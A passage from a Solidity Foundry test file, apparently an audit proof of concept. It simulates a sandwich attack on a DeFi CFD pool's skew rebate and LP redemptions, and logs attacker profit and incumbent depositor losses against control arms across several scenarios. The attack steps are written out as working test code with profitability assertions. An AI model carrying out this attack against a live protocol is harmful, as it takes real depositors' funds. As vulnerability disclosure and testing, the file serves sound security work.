        _kv("DEPTH_NEUTRAL", "group_deposited_usdg", _usdg(grpDep));
        _kv("DEPTH_NEUTRAL", "group_realized_attack_usdg", _usdg(grpAtk));
        _kv("DEPTH_NEUTRAL", "group_absolute_loss_usdg", _susdg(int256(grpDep) - int256(grpAtk)));
        _kv("DEPTH_NEUTRAL", "group_loss_vs_control_usdg", _susdg(int256(grpCtrl) - int256(grpAtk)));
        assertGt(atk.incRealized[0], ctrl.incRealized[0], "disclosed: the incumbent gains in this arm, the entrant is the victim");
        assertLt(grpAtk, grpDep, "GROUP ABSOLUTE loss vs deposits");
        assertLt(grpAtk, grpCtrl, "GROUP loss vs control");
        assertApproxEqAbs(_sumDelta(ctrl, atk), 0, 3e6, "conservation within 3 USDG");
    }

    /// @dev Disclosure: a third party reduces skew between the settlement and the attacker's close, so the
    ///      attacker's close does not refund c and the attacker LOSES. The refund is ordering dependent.
    function test_OrderingRisk_Disclosed() public {
        Scn memory s = _fund(1_000_000e6, 0, 0);
        Cfg[] memory cs = new Cfg[](3);
        cs[0] = _cfg(Mode.NoTrade, 1, 1_500_000e6);
        cs[1] = _cfg(Mode.Attack, 1, 1_500_000e6);
        cs[2] = _cfg(Mode.Attack, 1, 1_500_000e6);
        cs[2].honestShortDiv = 2;
        cs[1].sizeBps = 9900; // 99% of max skew leaves solvency headroom for the honest SHORT (OpenRevertCode 7)
        cs[2].sizeBps = 9900;
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory base = rs[1];
        Res memory hit = rs[2];
        _printArm("ORDERING control", s, ctrl);
        _printArm("ORDERING uninterrupted attack", s, base);
        _printArm("ORDERING attack with honest SHORT y/2 before the close", s, hit);
        _printCompare("ORDERING_uninterrupted", s, ctrl, base);
        _printCompare("ORDERING_third_party_interposes", s, ctrl, hit);
        console2.log(string.concat("[ORDERING] honest SHORT vpiAccrued (reserve-backed rebate) USDG = ", _susdg(hit.honestVpi)));
        console2.log(string.concat("[ORDERING] ATTACKER NET WHEN A THIRD PARTY REDUCES SKEW FIRST USDG = ", _susdg(hit.attackerNet)));
        _kv("ORDERING_risk", "attacker_net_uninterrupted_usdg", _susdg(base.attackerNet));
        _kv("ORDERING_risk", "attacker_net_interposed_usdg", _susdg(hit.attackerNet));
        _kv("ORDERING_risk", "honest_vpi_accrued_usdg", _susdg(hit.honestVpi));

        assertGt(base.attackerNet, 0, "uninterrupted sandwich profitable");
        assertLt(hit.honestVpi, 0, "honest skew-reducing open received a (reserve-backed) rebate");
        assertLt(hit.attackerNet, 0, "attacker loses when someone else reduces skew first");
    }

    /// @dev Scale: 20M pool (Senior 15M from an EOA, incumbent Junior 5M from two EOAs), attacker f ~ 0.6, one cycle.
    function test_Scale_D20M_S75_f060_RealizedClaims() public {
        Scn memory s = _fund(3_000_000e6, 2_000_000e6, 15_000_000e6);
        Cfg[] memory cs = new Cfg[](2);
        cs[0] = _cfg(Mode.NoTrade, 1, 7_500_000e6);
        cs[1] = _cfg(Mode.Attack, 1, 7_500_000e6);
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory atk = rs[1];
        _printArm("SCALE20M control", s, ctrl);
        _printArm("SCALE20M attack", s, atk);
        _printCompare("SCALE_D20M_S75_f060_1cycle", s, ctrl, atk);

        _commonAttackAsserts(s, ctrl, atk);
        assertGt(atk.fWad, 0.59e18, "f ~ 0.6");
        assertLt(atk.fWad, 0.61e18, "f ~ 0.6");
        assertApproxEqRel(atk.redeemAssets - ctrl.redeemAssets, atk.fWad * atk.vpiC / 1e18, 0.03e18, "uplift == f*c");
        assertApproxEqAbs(_sumDelta(ctrl, atk), 0, 5e6, "conservation within 5 USDG");
    }

    /// @dev Scale: eight 3-hour cycles inside ~24 h, then the incumbents (and the Senior LP) realize through claims.
    function test_Scale_D20M_S75_f060_EightCyclesPerDay_RealizedClaims() public {
        Scn memory s = _fund(3_000_000e6, 2_000_000e6, 15_000_000e6);
        Cfg[] memory cs = new Cfg[](2);
        cs[0] = _cfg(Mode.NoTrade, 8, 7_500_000e6);
        cs[1] = _cfg(Mode.Attack, 8, 7_500_000e6);
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory atk = rs[1];
        _printArm("DAY20M control", s, ctrl);
        _printArm("DAY20M attack", s, atk);
        for (uint256 i; i < 8; ++i) {
            int256 pnl = atk.cumNet[i] - (i == 0 ? int256(0) : atk.cumNet[i - 1]);
            console2.log(string.concat("[DAY20M] cycle ", vm.toString(i), " : f = ", _f4(atk.cycleF[i]), " ; c USDG = ", _usdg(atk.cycleC[i]), " ; attacker cycle PnL USDG = ", _susdg(pnl)));
            assertGt(pnl, 0, "each cycle profitable");
        }
        console2.log(string.concat("[DAY20M] elapsed seconds for 8 cycles = ", vm.toString(atk.elapsed)));
        _printCompare("SCALE_D20M_S75_f060_8cycles", s, ctrl, atk);
        _kv("SCALE_D20M_S75_f060_8cycles", "elapsed_seconds", vm.toString(atk.elapsed));
        _kv("SCALE_D20M_S75_f060_8cycles", "cumulative_attacker_profit_usdg", _susdg(atk.attackerNet));

        assertLe(atk.elapsed, 24 hours + 30 minutes, "8 cycles fit in ~24h");
        _commonAttackAsserts(s, ctrl, atk);
        assertGt(atk.attackerNet, 0, "cumulative attacker profit > 0");
        assertApproxEqAbs(_sumDelta(ctrl, atk), 0, 20e6, "conservation within 20 USDG");
    }

    /// @dev The close-leg execution fee stays in the pool when the close nets a VPI rebate
    ///      (CfdEnginePlanLib.sol:1059-1068: actionNet < 0 => actionRebateAssets, executionFeeAssets = 0).
    ///      Run at zero oracle confidence so prices equal the mark and the fee arithmetic is exact.
    function test_CloseFeeRouting() public {
        confE8 = 0;
        Scn memory s = _fund(1_000_000e6, 0, 0);
        Cfg[] memory cs = new Cfg[](2);
        cs[0] = _cfg(Mode.Attack, 1, 1_000_000e6);
        cs[0].victimsExit = false;
        cs[1] = _cfg(Mode.Attack, 1, 1_000_000e6);
        cs[1].victimsExit = false;
        cs[1].honestShortDiv = 1; // control: honest SHORT of equal size first => the attacker's close is skew-increasing
        Res[] memory rs = _arms(s, cs);
        Res memory a = rs[0];
        Res memory b = rs[1];

        uint256 fee = a.notional * 4 / 10_000; // 4 bps execution fee on one leg
        console2.log(string.concat("[FEE] notional USDG = ", _usdg(a.notional), " ; one-leg execution fee (4 bps) USDG = ", _usdg(fee)));
        console2.log(string.concat("[FEE] ARM A rebate close: treasury delta at OPEN USDG = ", _usdg(a.treasuryOpenDelta), " ; at CLOSE USDG = ", _usdg(a.treasuryCloseDelta), " ; total = ", _usdg(a.treasuryDelta)));
        console2.log(string.concat("[FEE] ARM A close preview: vpiDelta USDG = ", _susdg(a.pvVpiDelta), " ; executionFeeAssets (preview) USDG = ", _usdg(a.pvFee)));
        console2.log(string.concat("[FEE] ARM A trader clearinghouse delta at close USDG = ", _susdg(a.traderCloseDelta), " ; pool cash delta at close USDG = ", _susdg(a.poolCashCloseDelta)));
        console2.log(string.concat("[FEE] ARM B control (skew-increasing close): treasury delta at CLOSE USDG = ", _usdg(b.treasuryCloseDelta)));
        _kv("FEE_close_routing", "one_leg_fee_usdg", _usdg(fee));
        _kv("FEE_close_routing", "treasury_delta_open_usdg", _usdg(a.treasuryOpenDelta));
        _kv("FEE_close_routing", "treasury_delta_close_usdg", _usdg(a.treasuryCloseDelta));
        _kv("FEE_close_routing", "treasury_delta_total_usdg", _usdg(a.treasuryDelta));
        _kv("FEE_close_routing", "trader_close_delta_usdg", _susdg(a.traderCloseDelta));
        _kv("FEE_close_routing", "pool_cash_close_delta_usdg", _susdg(a.poolCashCloseDelta));
        _kv("FEE_close_routing", "control_treasury_delta_close_usdg", _usdg(b.treasuryCloseDelta));

        assertGt(fee, 0, "fee > 0");
        assertEq(a.treasuryOpenDelta, fee, "open leg: treasury credited the full execution fee");
        assertEq(a.treasuryCloseDelta, 0, "close leg (rebate): treasury credited 0");
        assertEq(a.treasuryDelta, fee, "treasury delta over the whole attack == open-leg fee only");
        // the rebate paid to the trader is net of the fee the pool keeps
        assertLt(a.poolCashCloseDelta, 0, "pool pays the net rebate");
        assertEq(-a.poolCashCloseDelta, a.traderCloseDelta, "pool outflow == trader inflow (nothing leaks to treasury)");
        assertApproxEqAbs(a.traderCloseDelta, -a.pvVpiDelta - int256(fee), 1e6, "trader receives refund - close fee (carry <= 1 USDG)");
        // control: the same close, when it nets a CHARGE instead of a rebate, credits the treasury the fee
        assertEq(b.treasuryCloseDelta, fee, "control: charge close credits the treasury the full fee");
    }

    /// @dev Optional scale: 50M pool at the release 80% Senior cap (Senior 40M, incumbent Junior 10M), attacker f ~ 0.6.
    ///      Any part of the redemption that the Junior ratio cap leaves queued is valued at NAV in the attacker's net
    ///      (stuckValue).
    function test_Scale_D50M_S80cap_f060_RealizedClaims() public {
        Scn memory s = _fund(6_000_000e6, 4_000_000e6, type(uint256).max);
        Cfg[] memory cs = new Cfg[](2);
        cs[0] = _cfg(Mode.NoTrade, 1, 15_000_000e6);
        cs[1] = _cfg(Mode.Attack, 1, 15_000_000e6);
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory atk = rs[1];
        _printArm("SCALE50M control", s, ctrl);
        _printArm("SCALE50M attack", s, atk);
        _printCompare("SCALE_D50M_S80cap_f060_1cycle", s, ctrl, atk);
        console2.log(string.concat("[SCALE50M] stuck (covenant-queued) shares valued: control = ", _usdg(ctrl.stuckValue), " ; attack = ", _usdg(atk.stuckValue)));
        _kv("SCALE_D50M_S80cap_f060_1cycle", "stuck_value_control_usdg", _usdg(ctrl.stuckValue));
        _kv("SCALE_D50M_S80cap_f060_1cycle", "stuck_value_attack_usdg", _usdg(atk.stuckValue));

        assertGt(atk.vpiC, 0, "open must pay positive VPI c");
        for (uint256 i; i < 2; ++i) {
            assertLt(atk.incRealized[i], s.incDep[i], "ABSOLUTE: unprivileged incumbent realized < its own deposit");
            assertLt(atk.incRealized[i], ctrl.incRealized[i], "incumbent realized < no-trade control");
        }
        assertGt(atk.attackerNet, 0, "attacker net > 0");
        assertGt(atk.attackerNet, ctrl.attackerNet, "attacker net above control");
        assertApproxEqAbs(_sumDelta(ctrl, atk), 0, 10e6, "conservation within 10 USDG");
    }

    /// @dev Sub-majority attacker share (f < 0.43) WITH pre-existing honest same-side skew. An unrelated honest trader
    ///      opens a LONG first (about 0.25 of the pool depth at the attacker's open). The attacker (Junior share f ~ 0.33,
    ///      deposited at fair NAV) then adds more LONG skew within the 0.4 max-skew cap before its matured redemption
    ///      settles, the unrelated keeper settles, and the attacker closes. The control is the identical flow, honest
    ///      trader included, from the same snapshot, with no attacker trade. Honest skew lowers the break-even f because
    ///      every unit the attacker adds is priced at the honest-skew marginal rate: gain f*c with c ~ k*(2*h + y)*y/2 of
    ///      depth against a cost of ~2 x 4 bp of the added notional (the open fee goes to the treasury; the close fee is
    ///      netted against the rebate and stays in the pool after the attacker has already been paid out).
    ///      Disclosure: the loss is measured against the control. The honest trader's fees keep the incumbents above their
    ///      deposit in absolute terms in this arm, so no absolute-loss claim is made here.
    function test_SubMajorityShare_WithHonestSkew_Profitable() public {
        Scn memory s = _fund(1_200_000e6, 800_000e6, 0); // incumbents: 2.0M Junior from two EOAs, no Senior
        uint256 honestSize = (750_000e6 * 1e12) / LOT * LOT; // honest LONG notional 750k
        Cfg[] memory cs = new Cfg[](3);
        cs[0] = _cfg(Mode.NoTrade, 1, 1_000_000e6); // control: honest LONG present, attacker only does the LP round trip
        cs[1] = _cfg(Mode.Attack, 1, 1_000_000e6);
        cs[2] = _cfg(Mode.CloseBeforeSettle, 1, 1_000_000e6); // negative control: same open, closed BEFORE the settlement
        for (uint256 i; i < 3; ++i) {
            cs[i].honestSize = honestSize;
        }
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory atk = rs[1];
        Res memory neg = rs[2];
        _printArm("SUBMAJ control (honest LONG present, no attacker trade)", s, ctrl);
        _printArm("SUBMAJ attack (honest LONG + attacker LONG, close after settlement)", s, atk);
        _printArm("SUBMAJ neg control (same open, closed before settlement)", s, neg);
        _printCompare("SUBMAJ_f033_honest_skew", s, ctrl, atk);
        _printCompare("SUBMAJ_neg_closed_before_settle", s, ctrl, neg);

        uint256 honestRatio = atk.honestNotional * 1e18 / atk.depthOpen;
        uint256 honestVsIncumbentDepth = atk.honestNotional * 1e18 / _incDepTotal(s);
        uint256 skewTotal = (atk.honestNotional + atk.notional) * 1e18 / atk.depthOpen;
        int256 lossVsCtrl = int256(_incTotal(ctrl)) - int256(_incTotal(atk));
        console2.log(string.concat("[SUBMAJ] f = ", _f4(atk.fWad), " ; honest skew ratio (honest notional / pool depth at attacker open) = ", _f4(honestRatio), " ; c USDG = ", _usdg(atk.vpiC)));
        console2.log(string.concat("[SUBMAJ] honest LONG notional USDG = ", _usdg(atk.honestNotional), " ; attacker LONG notional USDG = ", _usdg(atk.notional), " ; pool depth at open USDG = ", _usdg(atk.depthOpen)));
        console2.log(string.concat("[SUBMAJ] total skew / depth at open = ", _f4(skewTotal), " (cap 0.4000) ; honest notional / incumbent-only depth = ", _f4(honestVsIncumbentDepth)));
        console2.log(string.concat("[SUBMAJ] ATTACKER NET USDG = ", _susdg(atk.attackerNet), " ; control attacker net USDG = ", _susdg(ctrl.attackerNet), " ; neg-control attacker net USDG = ", _susdg(neg.attackerNet)));
        console2.log(string.concat("[SUBMAJ] INCUMBENT LOSS VS CONTROL USDG = ", _susdg(lossVsCtrl), " ; incumbents realized attack = ", _usdg(_incTotal(atk)), " vs control = ", _usdg(_incTotal(ctrl))));
        console2.log(string.concat("[SUBMAJ] honest trader PnL control = ", _susdg(ctrl.honestPnl), " ; attack = ", _susdg(atk.honestPnl), " (the honest trader is not the victim)"));
        _kv("SUBMAJ_f033_honest_skew", "honest_skew_ratio", _f4(honestRatio));
        _kv("SUBMAJ_f033_honest_skew", "total_skew_over_depth", _f4(skewTotal));
        _kv("SUBMAJ_f033_honest_skew", "honest_notional_usdg", _usdg(atk.honestNotional));
        _kv("SUBMAJ_f033_honest_skew", "attacker_notional_usdg", _usdg(atk.notional));
        _kv("SUBMAJ_f033_honest_skew", "attacker_net_neg_control_usdg", _susdg(neg.attackerNet));
        _kv("SUBMAJ_f033_honest_skew", "honest_pnl_control_usdg", _susdg(ctrl.honestPnl));
        _kv("SUBMAJ_f033_honest_skew", "honest_pnl_attack_usdg", _susdg(atk.honestPnl));

        // shape of the scenario
        assertGt(atk.fWad, 0.30e18, "f > 0.30");
        assertLt(atk.fWad, 0.35e18, "f < 0.35 (sub-majority, below the 0.43 no-honest-skew break-even)");
        assertGe(honestRatio, 0.20e18, "honest skew >= 0.20 of depth");
        assertLe(honestRatio, 0.30e18, "honest skew <= 0.30 of depth");
        assertLe(skewTotal, 0.4e18, "total skew within maxSkewRatio");
        assertGt(atk.vpiC, 0, "attacker open pays positive VPI c");
        assertEq(atk.stuckShares, 0, "attacker redemption fully funded");
        // outcome
        assertGt(atk.attackerNet, 0, "attacker net > 0");
        assertLe(ctrl.attackerNet, 0, "control: LP round trip alone does not profit");
        assertGe(ctrl.attackerNet, -1e6, "control: round-trip rounding only");
        assertApproxEqAbs(ctrl.honestPnl, atk.honestPnl, 1e6, "honest trader is not the victim (within 1 USDG)");
        for (uint256 i; i < 2; ++i) {
            assertLt(atk.incRealized[i], ctrl.incRealized[i], "incumbent realized (attack) < incumbent realized (control)");
        }
        assertLt(_incTotal(atk), _incTotal(ctrl), "incumbents total realized (attack) < control");
        assertApproxEqRel(atk.redeemAssets - ctrl.redeemAssets, atk.fWad * atk.vpiC / 1e18, 0.03e18, "uplift == f*c");
        assertApproxEqAbs(_sumDelta(ctrl, atk), 0, 2e6, "conservation within 2 USDG");
        // negative control: identical open closed before the settlement does not profit and does not hurt the incumbents
        assertEq(neg.vpiC, atk.vpiC, "same trade, same c");
        assertLt(neg.attackerNet, 0, "closed before settlement: attacker loses the fees");
        assertGe(_incTotal(neg) + 1e6, _incTotal(ctrl), "closed before settlement: incumbents not harmed");
    }
}
```
